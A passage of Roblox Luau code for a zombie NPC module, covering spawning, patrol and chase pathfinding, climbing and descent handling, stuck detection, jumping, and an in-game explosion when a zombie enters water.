	local rayParams = RaycastParams.new()
	rayParams.FilterType = Enum.RaycastFilterType.Exclude
	rayParams.FilterDescendantsInstances = {Workspace:FindFirstChild(""Sentinel"") or {}}
	local directions = {
		Vector3.new(1, 0, 0), Vector3.new(-1, 0, 0),
		Vector3.new(0, 0, 1), Vector3.new(0, 0, -1),
		Vector3.new(1, 0, 1).Unit, Vector3.new(-1, 0, -1).Unit,
		Vector3.new(1, 0, -1).Unit, Vector3.new(-1, 0, 1).Unit,
	}
	local bestClimbPos = nil
	local minDistanceToTarget = math.huge
	for _, direction in directions do
		for distance = 0.3, CONFIG.EdgeDetectionDistance, 0.3 do -- Tighter steps
			local checkPos = currentPos + direction * distance
			local rayResult = Workspace:Raycast(checkPos + Vector3.new(0, 50, 0), Vector3.new(0, -100, 0), rayParams)
			if rayResult then
				local surfacePos = rayResult.Position
				local heightDifference = targetPos.Y - surfacePos.Y
				local horizontalDistance = (Vector3.new(targetPos.X, 0, targetPos.Z) - Vector3.new(surfacePos.X, 0, surfacePos.Z)).Magnitude
				if heightDifference > 0 and heightDifference <= CONFIG.JumpHeight and horizontalDistance < minDistanceToTarget then
					local isWalkablePoint, _ = isWalkable(surfacePos)
					if isWalkablePoint then
						bestClimbPos = surfacePos
						minDistanceToTarget = horizontalDistance
					end
				end
			end
		end
	end
	if not bestClimbPos then
		local closestPos = Vector3.new(targetPos.X, currentPos.Y, targetPos.Z)
		local isWalkablePoint, _ = isWalkable(closestPos)
		if isWalkablePoint then
			-- print(""No climb position found, using closest horizontal point: "" .. tostring(closestPos))
			return closestPos
		end
	end
	return bestClimbPos
end

-- Check if NPC or target is on an elevated surface
local function isElevated(position)
	local rayParams = RaycastParams.new()
	rayParams.FilterType = Enum.RaycastFilterType.Exclude
	rayParams.FilterDescendantsInstances = {Workspace:FindFirstChild(""Sentinel"") or {}}
	local offsets = {
		Vector3.new(0, 0, 0),
		Vector3.new(0.5, 0, 0), Vector3.new(-0.5, 0, 0),
		Vector3.new(0, 0, 0.5), Vector3.new(0, 0, -0.5),
		Vector3.new(1, 0, 0), Vector3.new(-1, 0, 0),
		Vector3.new(0, 0, 1), Vector3.new(0, 0, -1),
	}
	for _, offset in ipairs(offsets) do
		local rayResult = Workspace:Raycast(position + Vector3.new(0, 5, 0) + offset, Vector3.new(0, -50, 0), rayParams)
		if rayResult then
			local heightDifference = position.Y - rayResult.Position.Y
			-- print(""isElevated hit: "" .. (rayResult.Instance and rayResult.Instance.Name or ""none"") .. "" at "" .. tostring(position))
			return heightDifference > CONFIG.DescentHeightThreshold, rayResult.Instance
		end
	end
	return false, nil
end


local function getSmoothedTargetPosition(target, lastTargetPos)
	if not target or not target.HumanoidRootPart then
		return lastTargetPos
	end
	local currentPos = target.HumanoidRootPart.Position
	if lastTargetPos then
		return lastTargetPos:Lerp(currentPos, 0.3)
	end
	return currentPos
end

-- Spawn a single zombie
function ZombieAI:SpawnZombieAt(zombieSpawnPart)
	if not zombieModel or not zombieSpawnPart then
		warn(""Sentinel or ZombieSpawn part not found"")
		return
	end
	if spawnedZombies[zombieSpawnPart] then
		warn(""Zombie already spawned at "" .. zombieSpawnPart.Name)
		return
	end
	local zombie = zombieModel:Clone()
	local humanoid = zombie.Humanoid
	humanoid.WalkSpeed = CONFIG.PatrolSpeed
	humanoid.HipHeight = 2
	humanoid.JumpPower = CONFIG.JumpHeight * 5
	humanoid.AutoJumpEnabled = true
	humanoid.Health = math.random(CONFIG.HealthRange[1], CONFIG.HealthRange[2])
	zombie:SetPrimaryPartCFrame(zombieSpawnPart.CFrame)
	zombie.Parent = Workspace
	spawnedZombies[zombieSpawnPart] = true
	table.insert(activeZombies, zombie)
	local initialPatrolPos = getValidPatrolPosition(zombieSpawnPart.Position, zombie.HumanoidRootPart.Position, zombie)
	coroutine.wrap(function()
		self:StartZombieAI(zombie, zombieSpawnPart, initialPatrolPos)
	end)()
end

-- AI behavior
function ZombieAI:StartZombieAI(zombie, zombieSpawnPart, initialPatrolPos)
	local humanoid = zombie.Humanoid
	local rootPart = zombie.HumanoidRootPart
	local spawnPos = zombieSpawnPart.Position
	if not spawnPos then
		warn(""StartZombieAI: Invalid spawnPos"")
		return
	end
	local currentTarget = nil
	local returningToSpawn = false
	local lastPatrolPos = initialPatrolPos
	local patrolTimer = 0
	local lastPosition = rootPart.Position
	local stuckTimer = 0
	local stuckCount = 0
	local descentTarget = nil
	local climbTarget = nil
	local losTimer = nil
	local lastPatrolChangeTime = 0
	local currentWaypointIndex = 1
	local cachedWaypoints = nil
	local lastJumpTime = 0
	local jumpState = { shouldJump = false, reason = nil }
	local lastTargetPos = nil
	local lastPathUpdate = 0
	local jumpAttempts = 0

	local function resetJumpState()
		jumpState.shouldJump = false
		jumpState.reason = nil
		humanoid.Jump = false
		lastJumpTime = 0
		jumpAttempts = 0
	end

	local function handleDeath()
		local index = table.find(activeZombies, zombie)
		if index then
			table.remove(activeZombies, index)
		end
		for spawnPart, _ in spawnedZombies do
			if (spawnPart.Position - spawnPos).Magnitude < 1 then
				spawnedZombies[spawnPart] = nil
				break
			end
		end
		NPCSound:StopSounds(zombie)
		zombie:Destroy()
		self:SpawnZombieAt(zombieSpawnPart)
	end

	humanoid.Died:Connect(handleDeath)

	while humanoid.Health > 0 do
		-- Reset jump state at start of loop
		if not (climbTarget or descentTarget) then
			resetJumpState()
		end

		if isWater(rootPart.Position) then
			local explosion = Instance.new(""Explosion"")
			explosion.Position = rootPart.Position
			explosion.BlastRadius = CONFIG.ExplosionRadius
			explosion.BlastPressure = 20
			explosion.DestroyJointRadiusPercent = 0
			explosion.ExplosionType = Enum.ExplosionType.NoCraters
			explosion.Parent = Workspace
			explosion.Hit:Connect(function(part)
				local playerHumanoid = part.Parent:FindFirstChildOfClass(""Humanoid"")
				if playerHumanoid and playerHumanoid ~= humanoid then
					local distance = (part.Position - explosion.Position).Magnitude
					if distance <= CONFIG.ExplosionRadius then
						playerHumanoid:TakeDamage(playerHumanoid.Health * CONFIG.ExplosionDamagePercent)
					end
				end
			end)
			NPCSound:StopSounds(zombie)
			handleDeath()
			break
		end

		-- Check if NPC is on an elevated surface
		local isElevatedFlag, hitInstance = isElevated(rootPart.Position)
		local onMushroom2 = hitInstance and hitInstance.Name == ""Mushroom2""
		local onTree = hitInstance and string.find(hitInstance.Name:lower(), ""tree"") ~= nil
		local onAvoidableModel = onMushroom2 or onTree

		-- Immediate descent if on tree or Mushroom2
		if onAvoidableModel and not descentTarget then
			descentTarget = findDescentPosition(rootPart.Position)
			if descentTarget then
				local direction = (descentTarget - rootPart.Position).Unit * humanoid.WalkSpeed
				humanoid:Move(direction, false)
				jumpState.shouldJump = true
				jumpState.reason = ""Descent from "" .. (onMushroom2 and ""Mushroom2"" or ""tree"")
				-- print(""Descending from "" .. (onMushroom2 and ""Mushroom2"" or ""tree model "" .. (hitInstance and hitInstance.Name or ""unknown"")) .. "" to "" .. tostring(descentTarget))
				if (rootPart.Position - descentTarget).Magnitude < 1 then
					descentTarget = nil
					resetJumpState()
				end
				lastPosition = rootPart.Position
				wait(0.05)
				continue
			end
		end

		-- Target selection
		if not currentTarget then
			for _, player in game.Players:GetPlayers() do
				if player.Character and player.Character.Humanoid and player.Character.Humanoid.Health > 0 then
					local distance = (player.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude
					local inLOS = distance <= CONFIG.MaxLOSDistance and hasLineOfSight(zombie, player.Character)
					if distance <= CONFIG.DetectionRange or inLOS then
						local targetPlayer = player.Character
						if inLOS and not losTimer then
							losTimer = task.delay(0.3, function()
								if targetPlayer and targetPlayer.Humanoid and targetPlayer.Humanoid.Health > 0 and hasLineOfSight(zombie, targetPlayer) then
									currentTarget = targetPlayer
									humanoid.WalkSpeed = CONFIG.ChaseSpeed
									returningToSpawn = false
									lastPatrolPos = nil
									patrolTimer = 0
									stuckTimer = 0
									stuckCount = 0
									descentTarget = nil
									climbTarget = nil
									currentWaypointIndex = 1
									cachedWaypoints = nil
									lastTargetPos = nil
									lastPathUpdate = 0
									resetJumpState()
									NPCSound:PlayChaseSound(zombie)
									-- print(""Chasing player (LOS) at distance: "" .. distance)
								end
								losTimer = nil
							end)
						elseif distance <= CONFIG.DetectionRange then
							currentTarget = targetPlayer
							humanoid.WalkSpeed = CONFIG.ChaseSpeed
							returningToSpawn = false
							lastPatrolPos = nil
							patrolTimer = 0
							stuckTimer = 0
							stuckCount = 0
							descentTarget = nil
							climbTarget = nil
							currentWaypointIndex = 1
							cachedWaypoints = nil
							lastTargetPos = nil
							lastPathUpdate = 0
							resetJumpState()
							NPCSound:PlayChaseSound(zombie)
							-- print(""Chasing player (distance) at distance: "" .. distance)
						end
						break
					end
				end
			end
		end

		if currentTarget then
			local targetPos = getSmoothedTargetPosition(currentTarget, lastTargetPos)
			lastTargetPos = targetPos
			local distanceToTarget = (targetPos - rootPart.Position).Magnitude
			local targetInWater = isWater(targetPos)

			if not currentTarget.Humanoid or currentTarget.Humanoid.Health <= 0 or distanceToTarget > CONFIG.ChaseAbandonRange or targetInWater then
				currentTarget = nil
				humanoid.WalkSpeed = CONFIG.PatrolSpeed
				humanoid:Move(Vector3.new(0, 0, 0), false)
				returningToSpawn = true
				lastPatrolPos = nil
				patrolTimer = 0
				stuckTimer = 0
				stuckCount = 0
				descentTarget = nil
				climbTarget = nil
				losTimer = nil
				currentWaypointIndex = 1
				cachedWaypoints = nil
				lastTargetPos = nil
				lastPathUpdate = 0
				resetJumpState()
				NPCSound:StopSounds(zombie)
				-- print(""Stopped chasing, transitioning to patrol"")
			else
				-- Check if target is elevated
				local isTargetElevated, targetInstance = isElevated(targetPos)
				local effectiveTargetPos = targetPos
				if isTargetElevated then
					local rayParams = RaycastParams.new()
					rayParams.FilterType = Enum.RaycastFilterType.Exclude
					rayParams.FilterDescendantsInstances = {Workspace:FindFirstChild(""Sentinel"") or {}}
					local offsets = {
						Vector3.new(0, 0, 0),
						Vector3.new(1, 0, 0), Vector3.new(-1, 0, 0),
						Vector3.new(0, 0, 1), Vector3.new(0, 0, -1),
						Vector3.new(0.5, 0, 0.5), Vector3.new(-0.5, 0, -0.5),
					}
					for _, offset in ipairs(offsets) do
						local rayResult = Workspace:Raycast(targetPos + Vector3.new(0, 5, 0) + offset, Vector3.new(0, -50, 0), rayParams)
						if rayResult then
							effectiveTargetPos = Vector3.new(targetPos.X, rayResult.Position.Y + 0.1, targetPos.Z)
							-- print(""Target is elevated, pathfinding to base: "" .. tostring(effectiveTargetPos))
							break
						end
					end
				end

				-- Handle climbing to reach elevated target
				if isTargetElevated and not climbTarget then
					climbTarget = findClimbPosition(rootPart.Position, targetPos)
					if climbTarget then
						local direction = (climbTarget - rootPart.Position).Unit * humanoid.WalkSpeed
						humanoid:Move(direction, false)
						local heightDifference = targetPos.Y - rootPart.Position.Y
						if heightDifference > CONFIG.JumpHeightThreshold and heightDifference <= CONFIG.JumpHeight and tick() - lastJumpTime >= CONFIG.JumpCooldown and (rootPart.Position - climbTarget).Magnitude < 4 then
							jumpState.shouldJump = true
							jumpState.reason = ""Climbing to crate""
							-- print(""Climbing to "" .. tostring(climbTarget) .. "", height: "" .. heightDifference)
						end
						if (rootPart.Position - climbTarget).Magnitude < 4 then
							climbTarget = nil
							resetJumpState()
						end
						lastPosition = rootPart.Position
						wait(0.05)
						continue
					end
				end

				-- Validate effectiveTargetPos
				local isValidTarget, _ = isWalkable(effectiveTargetPos)
				if not isValidTarget then
					effectiveTargetPos = Vector3.new(effectiveTargetPos.X, rootPart.Position.Y, effectiveTargetPos.Z)
				end

				-- Update path less frequently
				if tick() - lastPathUpdate >= 0.5 then
					local path = PathfindingService:CreatePath()
					path:ComputeAsync(rootPart.Position, effectiveTargetPos)
					if path.Status == Enum.PathStatus.Success then
						local waypoints = path:GetWaypoints()
						if #waypoints > 1 then
							local nextWaypoint = waypoints[2].Position
							local isWaypointElevated, waypointInstance = isElevated(nextWaypoint)
							local isWaypointOnMushroom2 = waypointInstance and waypointInstance.Name == ""Mushroom2""
							local isWaypointOnTree = waypointInstance and string.find(waypointInstance.Name:lower(), ""tree"") ~= nil
							local isWaypointOnAvoidableModel = isWaypointOnMushroom2 or isWaypointOnTree
							-- print(""Chase waypoint at "" .. tostring(nextWaypoint) .. "": Mushroom2="" .. tostring(isWaypointOnMushroom2) .. "", Tree="" .. tostring(isWaypointOnTree))
							if isWaypointOnAvoidableModel then
								currentWaypointIndex = 1
								path:ComputeAsync(rootPart.Position, effectiveTargetPos)
								waypoints = path:GetWaypoints()
								if #waypoints > 1 then
									nextWaypoint = waypoints[2].Position
								else
									humanoid:Move(Vector3.new(0, 0, 0), false)
									stuckTimer = 0
									stuckCount = 0
									resetJumpState()
									-- print(""No valid chase waypoints after skipping "" .. (isWaypointOnMushroom2 and ""Mushroom2"" or ""tree model "" .. (waypointInstance and waypointInstance.Name or ""unknown"")))
									wait(0.05)
									continue
								end
								-- print(""Walking around "" .. (isWaypointOnMushroom2 and ""Mushroom2"" or ""tree model "" .. (waypointInstance and waypointInstance.Name or ""unknown"")) .. "" in chase"")
							end

							if not isWater(nextWaypoint) and isPathClear(rootPart.Position, nextWaypoint, zombie) then
								local heightDifferenceToTarget = targetPos.Y - rootPart.Position.Y
								if heightDifferenceToTarget > CONFIG.DescentHeightThreshold and not descentTarget and not climbTarget then
									descentTarget = findDescentPosition(rootPart.Position)
									if descentTarget then
										local direction = (descentTarget - rootPart.Position).Unit * humanoid.WalkSpeed
										humanoid:Move(direction, false)
										jumpState.shouldJump = true
										jumpState.reason = ""Descent during chase""
										if (rootPart.Position - descentTarget).Magnitude < 1 then
											descentTarget = nil
											resetJumpState()
										end
										lastPosition = rootPart.Position
										wait(0.05)
										continue
									end
								else
									descentTarget = nil
								end

								local heightDifference = nextWaypoint.Y - rootPart.Position.Y
								local isWalkableWaypoint, slopeAngle = isWalkable(nextWaypoint)
								local hasObstacleFlag, obstaclePos = hasObstacle(rootPart.Position, nextWaypoint, zombie)
								if ((heightDifference > CONFIG.JumpHeightThreshold and heightDifference <= CONFIG.JumpHeight) or (isWalkableWaypoint and slopeAngle > 45)) and hasObstacleFlag and tick() - lastJumpTime >= CONFIG.JumpCooldown then
									jumpState.shouldJump = true
									jumpState.reason = ""Terrain navigation (height: "" .. heightDifference .. "", slope: "" .. slopeAngle .. "", obstacle at: "" .. tostring(obstaclePos) .. "")""
									-- print(""Jump triggered during chase at "" .. tostring(nextWaypoint) .. "", slope: "" .. slopeAngle .. "", height: "" .. heightDifference .. "", obstacle at: "" .. tostring(obstaclePos))
								end
								local movedDistance = (rootPart.Position - lastPosition).Magnitude
								if movedDistance < CONFIG.JumpMovementThreshold then
									stuckTimer = stuckTimer + 0.05
									if stuckTimer >= CONFIG.JumpStuckTimeout then
										stuckCount = stuckCount + 1
										if stuckCount >= 12 and onAvoidableModel then
											descentTarget = findDescentPosition(rootPart.Position)
											if descentTarget then
												-- print(""Stuck on "" .. (onMushroom2 and ""Mushroom2"" or ""tree model "" .. (hitInstance and hitInstance.Name or ""unknown"")) .. "", forcing descent"")
											else
												currentWaypointIndex = 1
												path:ComputeAsync(rootPart.Position, effectiveTargetPos)
												-- print(""Stuck on "" .. (onMushroom2 and ""Mushroom2"" or ""tree model "" .. (hitInstance and hitInstance.Name or ""unknown"")) .. "", recomputing path"")
											end
											stuckTimer = 0
											stuckCount = 0
											resetJumpState()
										elseif stuckCount >= 12 and hasObstacleFlag then
											currentWaypointIndex = 1
											path:ComputeAsync(rootPart.Position, effectiveTargetPos)
											-- print(""NPC stuck during chase at "" .. tostring(rootPart.Position) .. "", recomputing path"")
											stuckTimer = 0
											stuckCount = 0
											if tick() - lastJumpTime >= CONFIG.JumpCooldown then
												jumpState.shouldJump = true
												jumpState.reason = ""Stuck during chase (obstacle at: "" .. tostring(obstaclePos) .. "")""
												-- print(""Jump triggered due to stuck during chase at "" .. tostring(nextWaypoint) .. "", obstacle at: "" .. tostring(obstaclePos))
											end
										else
											stuckTimer = 0
										end
									end
								else
									stuckTimer = 0
									stuckCount = 0
								end
								local direction = (nextWaypoint - rootPart.Position).Unit * humanoid.WalkSpeed
								humanoid:Move(direction, false)
							end
						else
							humanoid:Move(Vector3.new(0, 0, 0), false)
							stuckTimer = 0
							stuckCount = 0
							resetJumpState()
						end
						lastPathUpdate = tick()
					else
						-- Try alternative positions
						local offsets = {
							Vector3.new(5, 0, 0), Vector3.new(-5, 0, 0),
							Vector3.new(0, 0, 5), Vector3.new(0, 0, -5),
							Vector3.new(3, 0, 3), Vector3.new(-3, 0, -3),
							Vector3.new(7, 0, 0), Vector3.new(-7, 0, 0),
							Vector3.new(0, 0, 7), Vector3.new(0, 0, -7),
						}
						local pathFound = false
						for _, offset in ipairs(offsets) do
							local altPos = effectiveTargetPos + offset
							if isWalkable(altPos) then
								path:ComputeAsync(rootPart.Position, altPos)
								if path.Status == Enum.PathStatus.Success then
									local waypoints = path:GetWaypoints()
									if #waypoints > 1 then
										local nextWaypoint = waypoints[2].Position
										local direction = (nextWaypoint - rootPart.Position).Unit * humanoid.WalkSpeed
										humanoid:Move(direction, false)
										-- print(""Path failed to "" .. tostring(effectiveTargetPos) .. "", using alternative: "" .. tostring(altPos))
										pathFound = true
										lastPathUpdate = tick()
										break
									end
								end
							end
						end
						if not pathFound then
							local horizontalTargetPos = Vector3.new(targetPos.X, rootPart.Position.Y, targetPos.Z)
							local direction = (horizontalTargetPos - rootPart.Position).Unit * humanoid.WalkSpeed
							if (horizontalTargetPos - rootPart.Position).Magnitude > 4 then
								humanoid:Move(direction, false)
								-- print(""Path failed to "" .. tostring(effectiveTargetPos) .. "", moving to horizontal: "" .. tostring(horizontalTargetPos))
							else
								if tick() - lastJumpTime >= CONFIG.JumpCooldown and jumpAttempts < 3 then
									jumpState.shouldJump = true
									jumpState.reason = ""Path failed, attempting jump (attempt "" .. (jumpAttempts + 1) .. "")""
									jumpAttempts = jumpAttempts + 1
									-- print(""Path failed, attempting jump at "" .. tostring(rootPart.Position) .. "", attempt "" .. jumpAttempts)
								end
							end
							stuckTimer = 0
							stuckCount = 0
						end
					end
				end
				if distanceToTarget <= 5 then
					currentTarget.Humanoid:TakeDamage(CONFIG.AttackDamage)
				end
			end
		end

		if not currentTarget then
			local distanceToSpawn = (rootPart.Position - spawnPos).Magnitude
			if returningToSpawn and distanceToSpawn > CONFIG.ReturnDistanceThreshold then
				if tick() - lastPathUpdate >= 0.5 then
					local path = PathfindingService:CreatePath()
					path:ComputeAsync(rootPart.Position, spawnPos)
					if path.Status == Enum.PathStatus.Success then
						local waypoints = path:GetWaypoints()
						if #waypoints > 1 then
							local nextWaypoint = waypoints[2].Position
							local isWaypointElevated, waypointInstance = isElevated(nextWaypoint)
							local isWaypointOnMushroom2 = waypointInstance and waypointInstance.Name == ""Mushroom2""
							local isWaypointOnTree = waypointInstance and string.find(waypointInstance.Name:lower(), ""tree"") ~= nil
							local isWaypointOnAvoidableModel = isWaypointOnMushroom2 or isWaypointOnTree
							-- print(""Return waypoint at "" .. tostring(nextWaypoint) .. "": Mushroom2="" .. tostring(isWaypointOnMushroom2) .. "", Tree="" .. tostring(isWaypointOnTree))
							if isWaypointOnAvoidableModel then
								currentWaypointIndex = 1
								path:ComputeAsync(rootPart.Position, spawnPos)
								waypoints = path:GetWaypoints()
								if #waypoints > 1 then
									nextWaypoint = waypoints[2].Position
								else
									humanoid:Move(Vector3.new(0, 0, 0), false)
									stuckTimer = 0
									stuckCount = 0
									resetJumpState()
									-- print(""No valid return waypoints after skipping "" .. (isWaypointOnMushroom2 and ""Mushroom2"" or ""tree model "" .. (waypointInstance and waypointInstance.Name or ""unknown"")))
									wait(0.05)
									continue
								end
								-- print(""Walking around "" .. (isWaypointOnMushroom2 and ""Mushroom2"" or ""tree model "" .. (waypointInstance and waypointInstance.Name or ""unknown"")) .. "" in return"")
							end
							if not isWater(nextWaypoint) and isPathClear(rootPart.Position, nextWaypoint, zombie) then
								local heightDifferenceToSpawn = rootPart.Position.Y - spawnPos.Y
								if heightDifferenceToSpawn > CONFIG.DescentHeightThreshold and not descentTarget then
									descentTarget = findDescentPosition(rootPart.Position)
									if descentTarget then
										local direction = (descentTarget - rootPart.Position).Unit * CONFIG.PatrolSpeed
										humanoid:Move(direction, false)
										jumpState.shouldJump = true
										jumpState.reason = ""Descent during return""
										if (rootPart.Position - descentTarget).Magnitude < 1 then
											descentTarget = nil
											resetJumpState()
										end
										lastPosition = rootPart.Position
										wait(0.05)
										continue
									end
								else
									descentTarget = nil
								end
								local heightDifference = nextWaypoint.Y - rootPart.Position.Y
								local isWalkableWaypoint, slopeAngle = isWalkable(nextWaypoint)
								local hasObstacleFlag, obstaclePos = hasObstacle(rootPart.Position, nextWaypoint, zombie)
								if ((heightDifference > 7 and heightDifference <= CONFIG.JumpHeight) or (isWalkableWaypoint and slopeAngle > 50)) and hasObstacleFlag and tick() - lastJumpTime >= CONFIG.PatrolJumpCooldown then
									jumpState.shouldJump = true
									jumpState.reason = ""Terrain navigation in return (height: "" .. heightDifference .. "", slope: "" .. slopeAngle .. "", obstacle at: "" .. tostring(obstaclePos) .. "")""
									-- print(""Jump triggered during return at "" .. tostring(nextWaypoint) .. "", slope: "" .. slopeAngle .. "", height: "" .. heightDifference .. "", obstacle at: "" .. tostring(obstaclePos))
								end
								local movedDistance = (rootPart.Position - lastPosition).Magnitude
								if movedDistance < CONFIG.JumpMovementThreshold then
									stuckTimer = stuckTimer + 0.05
									if stuckTimer >= CONFIG.JumpStuckTimeout then
										stuckCount = stuckCount + 1
										if stuckCount >= 15 and onAvoidableModel then
											descentTarget = findDescentPosition(rootPart.Position)
											if descentTarget then
												-- print(""Stuck on "" .. (onMushroom2 and ""Mushroom2"" or ""tree model "" .. (hitInstance and hitInstance.Name or ""unknown"")) .. "", forcing descent"")
											else
												currentWaypointIndex = 1
												path:ComputeAsync(rootPart.Position, spawnPos)
												-- print(""Stuck on "" .. (onMushroom2 and ""Mushroom2"" or ""tree model "" .. (hitInstance and hitInstance.Name or ""unknown"")) .. "", recomputing path"")
											end
											stuckTimer = 0
											stuckCount = 0
											resetJumpState()
										elseif stuckCount >= 15 and hasObstacleFlag then
											currentWaypointIndex = 1
											path:ComputeAsync(rootPart.Position, spawnPos)
											-- print(""NPC stuck returning to spawn at "" .. tostring(rootPart.Position))
											stuckTimer = 0
											stuckCount = 0
											if tick() - lastJumpTime >= CONFIG.PatrolJumpCooldown then
												jumpState.shouldJump = true
												jumpState.reason = ""Stuck during return (obstacle at: "" .. tostring(obstaclePos) .. "")""
												-- print(""Jump triggered due to stuck during return at "" .. tostring(nextWaypoint) .. "", obstacle at: "" .. tostring(obstaclePos))
											end
										else
											stuckTimer = 0
										end
									end
								else
									stuckTimer = 0
									stuckCount = 0
								end
								local direction = (nextWaypoint - rootPart.Position).Unit * CONFIG.PatrolSpeed
								humanoid:Move(direction, false)
							end
						else
							humanoid:Move(Vector3.new(0, 0, 0), false)
							stuckTimer = 0
							stuckCount = 0
							resetJumpState()
						end
						lastPathUpdate = tick()
					else
						humanoid:Move(Vector3.new(0, 0, 0), false)
						stuckTimer = 0
						stuckCount = 0
						resetJumpState()
						warn(""Path computation failed for zombie returning to spawn at "" .. tostring(spawnPos))
					end
				end
				lastPatrolPos = nil
				patrolTimer = 0
				currentWaypointIndex = 1
				cachedWaypoints = nil
				stuckCount = 0
			else
				returningToSpawn = false
				patrolTimer = patrolTimer + 0.05
				stuckTimer = 0
				descentTarget = nil
				climbTarget = nil
				resetJumpState()
				NPCSound:PlayPatrolSound(zombie)

				if not lastPatrolPos or patrolTimer >= CONFIG.PatrolTimeout then
					local currentTime = tick()
					if not lastPatrolPos or currentTime - lastPatrolChangeTime >= CONFIG.MinPatrolPointDelay then
						lastPatrolPos = getValidPatrolPosition(spawnPos, rootPart.Position, zombie)
						patrolTimer = 0
						lastPatrolChangeTime = currentTime
						currentWaypointIndex = 1
						cachedWaypoints = nil
						stuckCount = 0
						resetJumpState()
						-- print(""New patrol point selected: "" .. tostring(lastPatrolPos))
					end
				end
				if lastPatrolPos then
					if not cachedWaypoints or tick() - lastPathUpdate >= 0.5 then
						local path = PathfindingService:CreatePath()
						path:ComputeAsync(rootPart.Position, lastPatrolPos)
						if path.Status == Enum.PathStatus.Success then
							cachedWaypoints = path:GetWaypoints()
							-- print(""Path computed with "" .. #cachedWaypoints .. "" waypoints"")
							lastPathUpdate = tick()
						else
							-- print(""Path computation failed for patrol to "" .. tostring(lastPatrolPos) .. "", selecting new point"")
							lastPatrolPos = getValidPatrolPosition(spawnPos, rootPart.Position, zombie)
							currentWaypointIndex = 1
							cachedWaypoints = nil
							humanoid:Move(Vector3.new(0, 0, 0), false)
							resetJumpState()
							wait(0.05)
							continue
						end
					end
					if cachedWaypoints and #cachedWaypoints > currentWaypointIndex then
						local nextWaypoint = cachedWaypoints[currentWaypointIndex].Position
						local isWaypointElevated, waypointInstance = isElevated(nextWaypoint)
						local isWaypointOnMushroom2 = waypointInstance and waypointInstance.Name == ""Mushroom2""
						local isWaypointOnTree = waypointInstance and string.find(waypointInstance.Name:lower(), ""tree"") ~= nil
						local isWaypointOnAvoidableModel = isWaypointOnMushroom2 or isWaypointOnTree
						-- print(""Patrol waypoint at "" .. tostring(nextWaypoint) .. "": Mushroom2="" .. tostring(isWaypointOnMushroom2) .. "", Tree="" .. tostring(isWaypointOnTree))
						if isWaypointOnAvoidableModel then
							-- print(""Avoiding "" .. (isWaypointOnMushroom2 and ""Mushroom2"" or ""tree model "" .. (waypointInstance and waypointInstance.Name or ""unknown"")) .. "" in patrol"")
							lastPatrolPos = getValidPatrolPosition(spawnPos, rootPart.Position, zombie)
							currentWaypointIndex = 1
							cachedWaypoints = nil
							resetJumpState()
							wait(0.05)
							continue
						end
						if not isWater(nextWaypoint) and (nextWaypoint - rootPart.Position).Magnitude >= CONFIG.MinWaypointDistance and isPathClear(rootPart.Position, nextWaypoint, zombie) then
							local heightDifference = nextWaypoint.Y - rootPart.Position.Y
							local isWalkableWaypoint, slopeAngle = isWalkable(nextWaypoint)
							local hasObstacleFlag, obstaclePos = hasObstacle(rootPart.Position, nextWaypoint, zombie)
							if ((heightDifference > 7 and heightDifference <= CONFIG.JumpHeight) or (isWalkableWaypoint and slopeAngle > 50)) and hasObstacleFlag and tick() - lastJumpTime >= CONFIG.PatrolJumpCooldown then
								jumpState.shouldJump = true
								jumpState.reason = ""Terrain navigation in patrol (height: "" .. heightDifference .. "", slope: "" .. slopeAngle .. "", obstacle at: "" .. tostring(obstaclePos) .. "")""
								-- print(""Jump triggered during patrol at "" .. tostring(nextWaypoint) .. "", slope: "" .. slopeAngle .. "", height: "" .. heightDifference .. "", obstacle at: "" .. tostring(obstaclePos))
							end
							local movedDistance = (rootPart.Position - lastPosition).Magnitude
							if movedDistance < CONFIG.JumpMovementThreshold then
								stuckTimer = stuckTimer + 0.05
								if stuckTimer >= CONFIG.JumpStuckTimeout then
									stuckCount = stuckCount + 1
									if stuckCount >= 15 and onAvoidableModel then
										descentTarget = findDescentPosition(rootPart.Position)
										if descentTarget then
											-- print(""Stuck on "" .. (onMushroom2 and ""Mushroom2"" or ""tree model "" .. (hitInstance and hitInstance.Name or ""unknown"")) .. "", forcing descent"")
										else
											lastPatrolPos = getValidPatrolPosition(spawnPos, rootPart.Position, zombie)
											currentWaypointIndex = 1
											cachedWaypoints = nil
											-- print(""Stuck on "" .. (onMushroom2 and ""Mushroom2"" or ""tree model "" .. (hitInstance and hitInstance.Name or ""unknown"")) .. "", resetting patrol point"")
										end
										stuckTimer = 0
										stuckCount = 0
										resetJumpState()
									elseif stuckCount >= 15 and hasObstacleFlag then
										lastPatrolPos = getValidPatrolPosition(spawnPos, rootPart.Position, zombie)
										currentWaypointIndex = 1
										cachedWaypoints = nil
										stuckTimer = 0
										stuckCount = 0
										if tick() - lastJumpTime >= CONFIG.PatrolJumpCooldown then
											jumpState.shouldJump = true
											jumpState.reason = ""Stuck during patrol (obstacle at: "" .. tostring(obstaclePos) .. "")""
											-- print(""NPC stuck during patrol at "" .. tostring(rootPart.Position) .. "", resetting patrol point, obstacle at: "" .. tostring(obstaclePos))
										end
									else
										stuckTimer = 0
									end
								end
							else
								stuckTimer = 0
								stuckCount = 0
							end
							local direction = (nextWaypoint - rootPart.Position).Unit * CONFIG.PatrolSpeed
							humanoid:Move(direction, false)
							if (rootPart.Position - nextWaypoint).Magnitude < 3 then
								currentWaypointIndex = currentWaypointIndex + 1
								-- print(""Moving to patrol waypoint "" .. currentWaypointIndex .. "" at "" .. tostring(nextWaypoint))
							end
						else
							currentWaypointIndex = currentWaypointIndex + 1
							-- print(""Skipping patrol waypoint "" .. currentWaypointIndex .. "" at "" .. tostring(nextWaypoint) .. "" (invalid, too close, or obstructed)"")
						end
					else
						if lastPatrolPos and (rootPart.Position - lastPatrolPos).Magnitude < 3 then
							lastPatrolPos = nil
							patrolTimer = CONFIG.PatrolTimeout
							currentWaypointIndex = 1
							cachedWaypoints = nil
							stuckCount = 0
							resetJumpState()
							-- print(""Reached patrol point, resetting"")
						end
					end
				else
					humanoid:Move(Vector3.new(0, 0, 0), false)
					resetJumpState()
				end
			end
		end

		-- Apply jump state
		if jumpState.shouldJump and tick() - lastJumpTime >= (currentTarget and CONFIG.JumpCooldown or CONFIG.PatrolJumpCooldown) then
			humanoid.Jump = true
			lastJumpTime = tick()
			-- print(""Applying jump: "" .. (jumpState.reason or ""Unknown reason"") .. "" at "" .. tostring(rootPart.Position))
		else
			humanoid.Jump = false
		end

		lastPosition = rootPart.Position
		wait(0.05)
	end
end

function ZombieAI:Init()
	local zombieSpawnParts = {}
	for _, part in Workspace:GetChildren() do
		if part.Name == ""ZombieSpawn"" then
